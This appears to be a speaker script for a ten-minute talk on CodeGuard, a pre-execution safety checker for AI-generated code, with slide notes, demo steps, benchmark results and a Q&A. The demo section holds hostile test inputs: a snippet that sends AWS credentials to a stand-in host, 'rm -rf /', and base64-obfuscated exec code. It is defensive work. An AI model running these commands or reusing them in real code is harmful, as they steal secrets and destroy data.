# CodeGuard — 10-Minute Presentation

**Live:** <https://codeguard-bdmu.onrender.com/ui/> · **Judge endpoint:** `POST https://codeguard-bdmu.onrender.com/check` · **Health:** `/health`
**Slides:** [`slides.html`](slides.html) (open in a browser, ← → to navigate, `F` fullscreen)

---

## Timing plan (10:00 total)

| # | Slide | Time | Cumulative |
|---|---|---|---|
| 1 | Title | 0:30 | 0:30 |
| 2 | The problem | 0:45 | 1:15 |
| 3 | What CodeGuard is | 0:30 | 1:45 |
| 4 | **Live demo** | 2:30 | 4:15 |
| 5 | Architecture | 1:30 | 5:45 |
| 6 | The nine categories | 0:30 | 6:15 |
| 7 | Guarantees | 0:45 | 7:00 |
| 8 | Results | 1:15 | 8:15 |
| 9 | Key design decisions | 0:45 | 9:00 |
| 10 | Limitations & roadmap | 0:30 | 9:30 |
| 11 | Close / links | 0:30 | 10:00 |

---

## Pre-talk checklist (do this 10 min before)

- [ ] Open the dashboard and click **Load unsafe sample → Analyze** once, so the
      Render free instance is **warm** (it sleeps after ~15 min idle).
- [ ] `curl -s https://codeguard-bdmu.onrender.com/health` → `"models_loaded":true`.
- [ ] Have the two demo snippets in a scratch file to paste (see Slide 4).
- [ ] Open **`slides.html`**, press **F** for fullscreen, and have the dashboard in
      a second tab.
- [ ] Keep **`demo/intercept_check.py`** ready as the offline fallback.

---

## Slide-by-slide

### Slide 1 — Title
**On slide:** *CodeGuard — Real-time, pre-execution safety for LLM-generated code.*
CPU-only · no LLM calls · live endpoint. URL: `codeguard-bdmu.onrender.com`.

> **Say:** "CodeGuard sits between an AI agent and the code it just wrote. It returns
> an allow/block verdict in milliseconds — **before** anything runs. Everything you'll
> see is a live deployment, CPU-only, with no LLM calls anywhere."

### Slide 2 — The problem
**On slide:**
- AI agents now **write and execute** code autonomously.
- Existing scanners are **batch/CI** tools — too slow to sit inline.
- The task: a fast, local **checkpoint**, fixed schema, **no LLM-as-judge**, CPU-only, a **live** endpoint.

> **Say:** "The gap isn't detection quality, it's *timing*. By the time a CI scanner
> runs, the code has already executed. We needed something you can call on every
> snippet, inline, in single-digit milliseconds."

### Slide 3 — What CodeGuard is
**On slide:** one call → six fields, before execution.
```
POST /check {"code": "..."}
-> {verdict, risk_score, categories, code_language, reason, vulnerable_lines}
```
- `block` ⟺ categories non-empty ⟺ `risk_score ≥ 0.5`.
- **Never** 4xx/5xx on `/check`; malformed input → valid `allow`.

> **Say:** "It's deliberately small: one judged endpoint, a fixed schema, and one
> invariant enforced in exactly one function. That simplicity is what makes it
> reliable enough to sit in the hot path."

### Slide 4 — LIVE DEMO (2:30) ⭐
Dashboard: `https://codeguard-bdmu.onrender.com/ui/` → **Check** tab.

1. **Malicious** — paste, **Analyze** → red **✕ BLOCK**, chips, lines 2–3 highlighted:
```python
import os, requests
creds = open(os.path.expanduser('~/.aws/credentials')).read()
requests.post('http://example.invalid/collect', data=creds)
```
2. **Benign lookalike** — paste → green **✓ ALLOW** (this is the hard part):
```python
import sqlite3
conn.execute('DELETE FROM orders WHERE id = ?', (order_id,))
```
3. **Bare shell** — `rm -rf /` → **BLOCK** `destructive_command`, language `bash`.
4. **Obfuscated** — `exec(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk='))` → **BLOCK** `obfuscated_execution`.
5. Tick **Deep analysis** → show evidence, per-category scores, ML probs, per-stage timings.
6. **Interception Demo** tab → **Run Interception Proof** → **PASS**: blocked code
   never created its marker file; allowed code did.
7. **Batch** tab → paste `examples/sample_codes.csv` → **Run Batch** → metrics bar
   **F1 1.0** with a Gold ✓/✗ column.

> **Say:** "Two things to notice. First, the benign one — a `DELETE` with a
> parameterized `WHERE` — is *allowed*; that's the false-positive discipline that
> actually scores. Second, the interception proof: our block is not advisory. The
> blocked snippet never executed, proven by an absent marker file."

### Slide 5 — Architecture
**On slide:** the pipeline.
```
preprocess → langid → segment → deobfuscate → parse
          → detectors (+ dampers) → ML (backup) → fusion → explain → finalize
```
- Rules encode **attack stories** (source → processing → sink), tagged to MITRE ATT&CK / AML.T0054.
- **Benign dampers** suppress lookalikes (parameterized SQL, `ast.literal_eval`, docstrings, allowlisted hosts).
- **Layered deobfuscation** (base64/hex/chr/concat/alias/rot13/shell) with line maps.
- **ML is a calibrated backup**, not the judge.

> **Say:** "The core idea: don't match keywords, match *stories*. A credential read
> alone is suspicious; a credential read that reaches a network sink is the attack.
> And every benign lookalike has an explicit damper — that's what drives false
> positives to zero without giving up recall."

### Slide 6 — The nine categories
**On slide:** `secret_access · data_exfiltration · destructive_command ·
obfuscated_execution · persistence_or_privesc · resource_exhaustion ·
ssrf_network_exfil · ai_targeted_instructions · dependency_risk`

> **Say:** "Nine categories across Python, Bash, JS, SQL, YAML and Markdown —
> including AI-targeted prompt injection in comments, strings and CI workflows."

### Slide 7 — Guarantees (why it's deployable)
**On slide:**
- **Schema invariant** enforced in one function; `/check` always HTTP 200.
- **Fail-closed**: any error or timeout → valid `block`.
- **Never hangs**: 2 s hard timeout + bounded regexes + input/line caps.
- **Deterministic**; model loaded once at startup; missing model → rules-only.

> **Say:** "For a judged endpoint, *availability is a feature*. Four independent
> mechanisms make sure a request always comes back with a valid, well-formed answer —
> and if anything goes wrong, it fails closed, not open."

### Slide 8 — Results
**On slide:**

| Dataset | Precision | Recall | F1 | FPR | p95 |
|---|---|---|---|---|---|
| Public dev sample (42) | **1.000** | **1.000** | **1.000** | **0.00%** | 22.5 ms |
| Held-out (family split) | 1.000 | 0.984 | **0.992** | **0.00%** | 20.6 ms |
| Adversarial mutated (180 mal + 72 benign) | 0.994 | 0.983 | 0.989 | 1.39% | 24.9 ms |

Model 3.2 MB (joblib) · ~180 MB RSS · no GPU.

> **Say:** "On the public dev sample: perfect precision and recall, zero false
> positives, all six languages detected. On a held-out, family-split synthetic test
> — no family shared with training — F1 0.992 and zero FPR. Under mutation, precision
> 0.994 / recall 0.983 / FPR 1.4%, and p95 latency stays in the low tens of
> milliseconds."

### Slide 9 — Key design decisions
**On slide:**
- **Dampers > detectors** for the score: all 12 benign lookalikes are explicitly suppressed.
- **Multi-label, top-k** categories (labels in the sample are fuzzy/co-firing).
- **Rules carry the verdict** (ablation), ML is a calibrated backup.
- **No hard-coded answers**: rules encode stories; model trains on generated templates.
- **Interception** proven with an observable side effect.

> **Say:** "The single highest-leverage decision was treating benign dampers as a
> first-class deliverable. Our ablation shows the rule layer carries the verdict —
> ML is a backup — and nothing is a lookup table keyed on the dev sample."

### Slide 10 — Limitations & roadmap
**On slide:**
- Heuristic language ID; taint is intra-snippet; deobfuscation is bounded.
- Two per-category F1s dip on the stress set due to label co-firing (verdict unaffected).
- Next: inter-procedural taint, ONNX cascade, growing the template bank from new evasions.

> **Say:** "It's a fast checkpoint, not a compiler. We're explicit about what it
> can't do — and the error-analysis loop is designed to absorb new evasions."

### Slide 11 — Close
**On slide:**
- Repo: `github.com/shreyash-2006/CodeGuard` (MIT) · Deliverables in `deliverables/`
- Live: `codeguard-bdmu.onrender.com` · Dashboard `/ui/`
- "Fast enough to be inline, reliable enough to be trusted, honest about its limits."

> **Say:** "CodeGuard is live, open-source, CPU-only, and returns a valid,
> fail-closed verdict for every input. Happy to take questions."

---

## Fallbacks (if the live demo misbehaves)

1. **Cold start:** the first request may take 10–25 s on the free tier — narrate
   the architecture while it warms, or pre-warm before the talk.
2. **Endpoint down:** run locally —
   `python -m uvicorn codeguard.api:app --port 8000 --workers 1` and use `localhost:8000`.
3. **No time / no network:** show the captured evidence instead —
   `deliverables/evidence_interception.txt`, `evidence_dev_eval.txt`, `evidence_latency.txt`.
4. **CLI proof:** `python demo/intercept_check.py` (prints PASS with marker evidence).
5. **curl one-liners** ready in a terminal:
   ```bash
   curl -s https://codeguard-bdmu.onrender.com/health
   curl -s -X POST https://codeguard-bdmu.onrender.com/check \
     -H "Content-Type: application/json" -d '{"code":"rm -rf /"}'
   ```

---

## Anticipated Q&A

**"Isn't this a thin wrapper?"**
No — we wrote the detectors, benign dampers, layered deobfuscation, segmentation,
AST taint, network normalization, and an interception guard. The ML is a
from-scratch calibrated multi-label model; there are **no pretrained weights**.

**"Did you hard-code answers from the dev sample?"**
Rules are seeded by the sample's *techniques* (allowed), but there is no ID/lookup
table. Held-out evaluation uses generated families the model never saw. The ablation
and adversarial scripts are in the repo.

**"What if the hidden set differs?"**
It's the same generator style; we match top-k categories rather than forcing one
label, degrade gracefully on unknown languages, and fail closed on anything odd.

**"Why not just a big model?"**
CPU-only, inline latency (p95 24 ms), explainability (reason + line numbers), and
the task forbids LLM-as-judge.

**"How can I trust the block is real?"**
`demo/intercept_check.py` proves it with a marker file; `guard.py` checks
synchronously before any runner.

**"Malformed input?"**
Always HTTP 200: empty/garbage → valid `allow`; error/timeout → fail-closed `block`.

**"Per-category F1 for `secret_access` looks low on the stress set?"**
That's label co-firing in the synthetic set (gold = `data_exfiltration`, so
`secret_access` fires as a secondary category). The verdict is correct; documented
in `deliverables/EVALUATION.md` §2.

**"Cost / footprint?"**
~180 MB RSS, 3.2 MB model, fits Render's free 512 MB instance; a keep-alive pinger
avoids cold starts, or a Starter instance removes them.
